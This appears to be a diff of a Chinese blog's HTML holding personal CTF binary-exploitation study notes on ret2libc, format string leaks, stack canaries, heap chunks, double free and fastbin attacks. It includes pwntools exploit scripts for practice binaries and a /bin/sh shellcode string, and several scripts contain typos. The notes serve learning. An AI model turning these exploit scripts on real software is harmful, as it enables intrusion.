secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">time</span>(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = <span class="keyword">rand</span>();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="keyword">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">input</span> == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125; <span class="comment">//此处system函数虽无后门 但提供system plt表象 使得在text中可自动将执行流拉入libc段</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p>
@@ -591,16 +332,11 @@ return 直接回到main函数
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p>
 <p>father中也含有子函数所需arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p>
 <p>查表易犯错误（直接调got）</p>
-<pre><code>ret = system@got(❌)
-</code></pre>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ret</span> = system@got(❌)</span><br></pre></td></tr></table></figure>
+
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p>
-<pre><code>elf = ELF(&quot;./dyntest&quot;)
-[
-  文件形式及保护
-]
-elf.got[&quot;puts&quot;]//获取函数表象地址
-hex(elf.got[&quot;puts&quot;])//获取函数真实地址
-</code></pre>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./dyntest&quot;</span>)</span><br><span class="line">[</span><br><span class="line">  文件形式及保护</span><br><span class="line">]</span><br><span class="line">elf.got[<span class="string">&quot;puts&quot;</span>]<span class="regexp">//</span>获取函数表象地址</span><br><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])<span class="regexp">//</span>获取函数真实地址</span><br></pre></td></tr></table></figure>
+
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" alt="image-20230419203107813"></p>
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p>
 <p>【nop slide】<br>使得ASLR继续执行ret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p>
@@ -613,9 +349,8 @@ hex(elf.got[&quot;puts&quot;])//获取函数真实地址
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p>
 <p>无”&#x2F;bin&#x2F;sh”也可映射 system函数地址（text段 plt）若无plt则需持续溢出直至出现真实地址<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p>
 <p>我是小偷 无需exit（）【偷完就跑】🤭</p>
-<pre><code>strings ret2libc1 | grep /bin/sh
-//string a.out | grep flag(简单逆向)
-</code></pre>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ret2libc1 | grep <span class="regexp">/bin/</span>sh</span><br><span class="line"><span class="regexp">//</span>string a.out | grep flag(简单逆向)</span><br></pre></td></tr></table></figure>
+
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p>
 <p>【ret2libc1】<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p>
@@ -626,52 +361,23 @@ hex(elf.got[&quot;puts&quot;])//获取函数真实地址
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p>
 <p>进阶版思路</p>
-<pre><code class="python">from pwn import *
-io = process(&quot;./ret2libc2&quot;)
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,gets_plt,pop_ebx,buf2,system_plt,<span class="number">0xdeadbeef</span>(pop_ebx),buf2])</span><br><span class="line"><span class="comment">#符合ret的寄存器均可不一定一定是pop_ebx</span></span><br><span class="line">io.seneline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin.sh&#x27;</span>)</span><br><span class="line">io.interactieve()</span><br></pre></td></tr></table></figure>
 
-gets_plt = 0x08048460
-system_plt = 0x08048490
-pop_ebx = 0x0804843d
-buf2 = 0x804a080
-payload = flat([b&#39;a&#39;*112,gets_plt,pop_ebx,buf2,system_plt,0xdeadbeef(pop_ebx),buf2])
-#符合ret的寄存器均可不一定一定是pop_ebx
-io.seneline(payload)
-io.sendline(b&#39;/bin.sh&#39;)
-io.interactieve()
-</code></pre>
 <p>【ret2libc3】</p>
-<pre><code class="python"> v8 = strtol(&amp;buf, v4, v5); 将字符串转化为整数存储在v8里
- long int strtol(const char *str, char **endptr, int base)
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = strtol(&amp;buf, v4, v5); 将字符串转化为整数存储在v8里</span><br><span class="line">long <span class="built_in">int</span> strtol(const char *<span class="built_in">str</span>, char **endptr, <span class="built_in">int</span> base)</span><br></pre></td></tr></table></figure>
+
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>注意我们输送send的值要用str【程序接收的总是str】 linux系统下最小单位一叶（4kb）<br>&#x2F;bin&#x2F;sh(通过绝对地址输入bin中的sh)&#x3D;&#x3D;sh</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<span class="comment">#lld ret2libc3查看本地libc(动态)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]))<span class="comment">#防bug与程序保持一致</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot; :&quot;</span>)</span><br><span class="line">libcBase = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">&quot;puts&quot;</span>]<span class="comment">#drop=True不保留返回值（此处为接收但不保留\n）</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt;&#123;:#x&#125;&quot;</span>,<span class="built_in">format</span>(libcBase))<span class="comment">#用来debug 结果正确后进行打印 &#123;:#&#125;格式化字符串</span></span><br><span class="line"><span class="comment">#format转换格式 前x表示转换为十六进制</span></span><br><span class="line"><span class="comment">#oneGadget = libcBase + 0x3a9fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat(cyclic(60),oneGadget)</span></span><br><span class="line">payload=flat(cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-io = process(&quot;./ret2libc3&quot;)
-elf = ELF(&quot;./ret2libc3&quot;)
-libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)#lld ret2libc3查看本地libc(动态)
-
-io.sendlineafter(b&quot; :&quot;,str(elf.got[&quot;puts&quot;]))#防bug与程序保持一致
-io.recvuntil(b&quot; :&quot;)
-libcBase = int(io.recvuntil(b&quot;\n&quot;,drop=True),16) - libc.symbols[&quot;puts&quot;]#drop=True不保留返回值（此处为接收但不保留\n）
-
-success(&quot;libcBase -&gt;&#123;:#x&#125;&quot;,format(libcBase))#用来debug 结果正确后进行打印 &#123;:#&#125;格式化字符串
-#format转换格式 前x表示转换为十六进制
-#oneGadget = libcBase + 0x3a9fc
-
-#payload = flat(cyclic(60),oneGadget)
-payload=flat(cyclic(60),libcBase+libc.symbols[&quot;system&quot;],0xdeadbeef,next(elf.search(b&quot;sh\x00&quot;)))
-io.sendlineafter(b&quot; :&quot;,payload)
-
-io.interactive()
-</code></pre>
 <p>偏移：文件某一个位置距文件开头第一个字节距离</p>
-<pre><code>one_gadget libc-2.23.so(动态链接文件名)-&gt;得偏移量 #碰运气喽😀
-</code></pre>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-<span class="number">2.23</span>.so<span class="function"><span class="params">(动态链接文件名)</span>-&gt;</span>得偏移量 <span class="comment">#碰运气喽😀</span></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p>
 <p>gdb调试<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p>
-<pre><code>set follow-fork-mode-parent 解决该问题（gdb中）
-</code></pre>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-<span class="built_in">mode</span>-parent 解决该问题（gdb中）</span><br></pre></td></tr></table></figure>
+
 <p>x64环境下传参要先传入六个寄存器中（rdi rsi rdx rcx r8 r9 ）<br>劫持程序返回到目的函数之前要先把目的函数的参数传递完毕（即传递参数的gadget放在目标函数之前）任何时候数据的写入都是从低地址向高地址写入<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p>
 <p>一般有jz跳转提示（一长串pop 寄存器）**[lib_csu]**</p>
@@ -687,8 +393,8 @@ io.interactive()
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p>
 <p>之前为segment fault 现why为stack samshing<br>覆盖后触发stack_chk_fail函数 强行退出程序 -&gt;stack smashing</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>如何在可爱女人中观察到Canary？<br>标志：段寄存器读入</p>
-<pre><code>v4 = _readfsqword(0x28) //🌰
-</code></pre>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v4</span> <span class="operator">=</span> _readfsqword(<span class="number">0</span>x28) //🌰</span><br></pre></td></tr></table></figure>
+
 <p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p>
 <p>Canary放置无硬性标准 需分析<br>elf文件较小时 地址可能在虚拟地址中映射两份<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230610163822498.png" alt="image-20230610163822498"></p>
 <p>strip去掉函数名——&gt;防护程序 （IDA中自动用偏移作为函数名）<br>此时无“main”函数【gdb中断点下不了】</p>
@@ -698,44 +404,21 @@ io.interactive()
 <p>write第三个参数无法获取时 运气（猜rdx&gt;8）</p>
 <p>ret需要给显示屏即标准输出 1是标准输出的代号</p>
 <p><strong>格式化字符串</strong>（保存在栈上）</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-int main()
-&#123;
-char s[100];
-int a = 1;
-int b = 0x22222222;
-int c = -1;
-scanf(&quot;%s&quot;,s);
-printf(&quot;%08x.%08x.%08x.%s\n&quot;,a.b,c,s);//第一个参数即为格式化字符串（%08x.）
-printf(s);
-return 0;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0x22222222</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>,a.b,c,s);<span class="comment">//第一个参数即为格式化字符串（%08x.）</span></span><br><span class="line"><span class="built_in">printf</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>不给参数情况下 会直接将栈中内容进行打印</p>
 <p>格式化字符串攻防中printf（”%s%s%s(足够长即可使得程序崩溃)”）</p>
 <p><strong>字符串截断漏洞主体利用思想</strong>：</p>
 <p> 截断符的篡改或抹去（让函数误解程序未执行完毕）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225648504.png" alt="image-20230615225648504"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615225717582.png" alt="image-20230615225717582"></p>
-<pre><code>%p溢出---&gt;实际将栈上重要数据进行打印（如地址）可用于绕过canary
-%s溢出---&gt;解析栈打印其中内容 ---&gt;泄露任意地址
-泄露任意地址：
-1.泄露栈上本身存在的地址（如read@got）
-2.泄露垃圾数据（篡改喽）再read@got
-</code></pre>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%p溢出---&gt;实际将栈上重要数据进行打印（如地址）可用于绕过canary</span><br><span class="line">%s溢出---&gt;解析栈打印其中内容 ---&gt;泄露任意地址</span><br><span class="line">泄露任意地址：</span><br><span class="line"><span class="number">1</span>.泄露栈上本身存在的地址（如<span class="keyword">read</span>@got）</span><br><span class="line"><span class="number">2</span>.泄露垃圾数据（篡改喽）再<span class="keyword">read</span>@got</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230615232327380.png" alt="image-20230615232327380"></p>
 <p>为避免flag和格式化字符串第一个参数距离很远直接传地址即可（printf（”%100$d”,a,b,c））</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616002416632.png" alt="image-20230616002416632"></p>
-<pre><code class="c">#include&lt;stdio.h&gt;
-int main()
-&#123;
-int a = 1;
-int b = 2;
-int c = 3;
-printf(&quot;%3$d&quot;,a,b,c);//打印出3  $n---&gt;打印出第几个参数
-return 0;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c);<span class="comment">//打印出3  $n---&gt;打印出第几个参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>%d —-&gt;打印有符号整型  -140….对应0xf（要么为动态链接库中地址 要么为栈上地址）<br><img src="https://cdn.jsdelivr.net/gh/yub/First@main/image-20230616134523270.png" alt="image-20230616134523270"></p>
 <p>逐参打印</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616134746197.png" alt="image-20230616134746197"></p>
@@ -751,9 +434,8 @@ return 0;
 <p>决定要素：主线程brk和mmap都可用<br>                   子线程只可用mmap<br>子线程申请空间过大在mmap段映射 小可直接在data段开辟<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230616175743170.png" alt="image-20230616175743170"></p>
 <p>malloc用户向堆管理器要内存 brk和mmap向操作系统申请</p>
 <p><strong>arena</strong>（将物理内存映射到虚拟内存空间存储管理）<br>内存分配区，可以理解为堆管理器所持有的内存池</p>
-<pre><code>操作系统--&gt;堆管理器--&gt;用户
-物理内存--&gt;arena--&gt;可用内存
-</code></pre>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">操作系统</span><span class="literal">--</span>&gt;<span class="comment">堆管理器</span><span class="literal">--</span>&gt;<span class="comment">用户</span></span><br><span class="line"><span class="comment">物理内存</span><span class="literal">--</span>&gt;<span class="comment">arena</span><span class="literal">--</span>&gt;<span class="comment">可用内存</span></span><br></pre></td></tr></table></figure>
+
 <p>堆管理器与用户的内存交易发生于arena中（堆管理器向操作系统批发来的有冗余的内存库）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230618233511677.png" alt="image-20230618233511677"></p>
 <p><strong>chunk</strong>（内存分配的最小单位 不可能小于8字节【两字长16字节（x64）】x32大小）<br>用户申请内存的单位，也是堆管理器管理内存的基本单位<br>malloc（）返回的指针指向一个chunk的数据区域 chunk大小 大于malloc分配大小<br>chunk分配规律：只能分配字长整数倍大小—&gt;size低三位一定为0</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617134142917.png" alt="image-20230617134142917"></p>
@@ -772,14 +454,8 @@ return 0;
 <p>x64最下chunk单位（0x20大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617222844117.png" alt="image-20230617222844117"></p>
 <p>x86 同理得最小大小为0x10（切一半）<br>控制字段不可填写 堆管理器满足用户需求向操作系统申请0x100大小实际申请chunk大小为0x110（pre size+size 两字长 16bits 0x10大小）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617223313606.png" alt="image-20230617223313606"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617225749420.png" alt="image-20230617225749420"></p>
-<pre><code class="c">#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-int main()
-&#123;
-void *ptr = malloc(0x100);
-free(ptr);
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>malloc得到的函数指针指向size （图中）但chunk开头的地址是</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230617230144174.png" alt="image-20230617230144174"></p>
 <p>其他chunk为程序自身利用缓冲区提供（如：printf函数 【未指定stdout缓冲区时 printf函数默认用malloc得到一个堆中的缓冲区为stdout所用】）</p>
@@ -815,40 +491,21 @@ free(ptr);
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619161430277.png" alt="image-20230619161430277"></p>
 <p>c分配到a所在的内存区域中 占用利用</p>
 <p>gdb偏移下断点方法</p>
-<pre><code>b *$rebase(0x..)【偏移】
-</code></pre>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">b</span> *<span class="variable">$rebase</span>(0x..)【偏移】</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193114872.png" alt="image-20230619193114872"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193556660.png" alt="image-20230619193556660"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203856606.png" alt="image-20230619203856606"></p>
 <p>第四次malloc后得到栈上地址（堆分配）</p>
 <p>free a后<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619193754379.png" alt="image-20230619193754379"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619194533056.png" alt="image-20230619194533056"></p>
 <p>防止double free漏洞（UAF）：控制内存的指针和内存均需清空 （chunk被清空但指针未清空）<br>意外：低权限指针可因使用同一块内存区域拥有高权限指针功能（若低权限指针篡改返回值高权限指针会无意识传送到pie中）</p>
-<pre><code class="c">#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-int main()
-&#123;
- int * p = malloc(16);
- free(p);
- free(p);
- return 0;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> * p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619195914454.png" alt="image-20230619195914454"></p>
 <p>tips：<br>1.glibc2.26&#x2F;2.27中无tache检查<br>2.fast bin会检查自身链表中每一个chunk大小是否为规定大小||新进入的chunk是否与上一个chunk重复（报double free 强制退出）</p>
 <p>绕过：</p>
-<pre><code class="c">#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-int main()
-&#123;
- int* p = malloc(16);
- malloc(16);
- int* ptr = malloc(16);
- free(p);
- free(ptr);
- free(p);
- return 0;
-&#125;
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span>* p = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="type">int</span>* ptr = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="built_in">free</span>(ptr);</span><br><span class="line"> <span class="built_in">free</span>(p);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>fastbin_attack<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619202854520.png" alt="image-20230619202854520"></p>
 <p>free后fd出现 此时此块chunk对于d来说为malloc chunk可被任意写入值（fd处）<br>fd写入一个stack值 诈骗fast bin过a后下一个free chunk在栈上 【任意霍霍实现】</p>
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230619203751739.png" alt="image-20230619203751739"><br>注意：fd始终指向下一个chunk开头地址 即stack对应栈上目标地址向上两个字长</p>
@@ -864,34 +521,8 @@ int main()
 <p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620174531638.png" alt="    ">吗 </p>
 <p>surprise<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230620201633271.png" alt="image-20230620201633271"></p>
 <p>echo3free后s使用的空间最后还是留在对应得4字长chunk中  o最后一个参数写入shellcode（greeting） 首地址作为参数进行传参</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./echo2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;%10$p&quot;</span>+<span class="string">b&quot;A&quot;</span>*<span class="number">3</span> <span class="comment">#A用作标记</span></span><br><span 